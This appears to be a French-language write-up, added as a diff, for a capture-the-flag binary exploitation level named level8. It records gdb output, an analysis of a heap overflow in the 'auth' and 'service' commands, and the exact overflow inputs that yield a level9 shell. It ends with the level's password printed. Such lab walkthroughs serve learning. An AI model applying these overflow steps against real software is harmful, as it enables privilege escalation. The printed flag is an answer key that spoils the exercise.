@@ -1,0 +1,33 @@
+-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8*
+
+(gdb) info variables 
+0x08049aac  auth
+0x08049ab0  service
+
+(gdb) info functions 
+0x08048564  main
+
+
+Analyse sur le source
+
+Il semblerait qu'il faille entrer plusieurs commandes
+Il faut écrire la commande puis un input jusqu'à 128
+
+auth fait un strcpy qui peut overflow sur 29bytes de l'input
+service n'a pour limite que 128 - 7
+
+La commande login vérifie l'addr auth+32 et si non nulle, donne acces au shell
+
+L'overflow a lieu sur la heap, aucun registre n'est utilisé donc intouchable
+
+Objectif:
+Il faut appeller auth en 1er puis service pour écrire sur tte la mémoire
+
+1-> auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+2-> service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
